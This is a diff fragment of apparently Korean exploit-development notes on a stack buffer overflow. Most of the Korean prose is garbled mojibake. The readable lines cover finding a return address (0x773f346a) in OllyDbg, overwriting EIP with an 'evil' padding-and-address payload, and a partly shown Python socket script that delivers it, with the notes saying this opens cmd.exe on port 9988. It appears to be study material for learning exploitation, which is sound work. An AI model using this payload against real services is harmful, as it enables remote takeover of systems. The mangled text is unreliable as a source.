+        - ollydbg ì˜ memory map ì°½ ì—´ê³  ë§ˆìš°ìŠ¤ ì˜¤ë¥¸ìª½ ë²„íŠ¼ìœ¼ë¡œ ì»¨í…ŒìŠ¤íŠ¸ ë©”ë‰´ë¥¼ ë„ìš´ í›„ Search ì°½ì„ ë„ì›Œ hexê°’ìœ¼ë¡œ ê²€ìƒ‰í•˜ê³ ìž í•˜ëŠ” ê°’ì„ ì°¾ìœ¼ë©´ë¨
+        - ì—¬ê¸°ì„œ text ì˜ì—­ì—ì„œ ì°¾ì€ ê°’ ì¤‘ 0x773f346aì—ìžˆëŠ” ê°’ì„ ì‚¬ìš©
+        - ì´ ì£¼ì†Œë¡œ EIP ë¥¼ ë®ëŠ” ì½”ë“œë¥¼ ìˆ˜ì •í•˜ìž
+    5. ë¦¬í‹€ì—”ë””ì•ˆ ê³ ë ¤
         - `evil = "A"*247 + "\x6a\x34\x3f\x77"*4 + "C"*8 + "D"*741`
-    6. 0x773f346a¿¡ breakpoint °É°í °ø°ÝÄÚµå ½ÇÇà
-        - EIP °¡ Á¤»óÀûÀ¸·Î¹Ù²ñ. 
-    7. ¿ì¸®°¡½ÇÇàÇÏ°íÀÚÇÏ´Â °ø°ÝÄÚµå¸¦ DDDD¿¡ ÇØ´çÇÏ´Â °÷¿¡ ³Ö±â
+    6. 0x773f346aì— breakpoint ê±¸ê³  ê³µê²©ì½”ë“œ ì‹¤í–‰
+        - EIP ê°€ ì •ìƒì ìœ¼ë¡œë°”ë€œ. 
+    7. ìš°ë¦¬ê°€ì‹¤í–‰í•˜ê³ ìží•˜ëŠ” ê³µê²©ì½”ë“œë¥¼ DDDDì— í•´ë‹¹í•˜ëŠ” ê³³ì— ë„£ê¸°
         ```py
         import socket
         import sys
@@ -566,4 +566,4 @@ int main(int argc, char* argv[]){
         s.send('QUIT\r\n'.encode())
         s.close()
         ```
-        9988 Æ÷Æ®¿¡ cmd.exe¸¦ ½ÇÇàÇÏ°Ô µÇ´Â ¸ð½ÀÀ» º¼ ¼ö ÀÖ´Ù.
+        9988 í¬íŠ¸ì— cmd.exeë¥¼ ì‹¤í–‰í•˜ê²Œ ë˜ëŠ” ëª¨ìŠµì„ ë³¼ ìˆ˜ ìžˆë‹¤.
